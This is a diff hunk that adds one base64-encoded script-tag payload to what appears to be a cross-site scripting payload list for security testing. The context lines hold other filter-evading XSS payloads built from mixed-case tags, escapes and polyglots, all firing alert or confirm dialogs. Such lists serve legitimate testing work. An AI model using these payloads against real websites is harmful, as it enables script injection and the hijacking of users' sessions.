@@ -51,6 +51,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/
 <</sCriPt/sCriPt><sCriPt>eval('\\u'+'0061'+'lert(1)')//</sCriPt>
 <</sCriPt/sCriPt><sCriPt ~~~>\u0061lert(1)</sCriPt ~~~>
 <sCriPt>setTimeout('alert\x280\x29',0);</sCriPt>
+<sCriPt src=data:text/jaVasCript;base64,YWxlcnQoJ1hTUycp></sCriPt>
 <sCriPt>window.location='javascript:confirm(0)';</sCriPt>
 <sCriPt x> confirm(1) </sCriPt 1=2
 <sCriPt x>confirm('XSS')<sCriPt y>
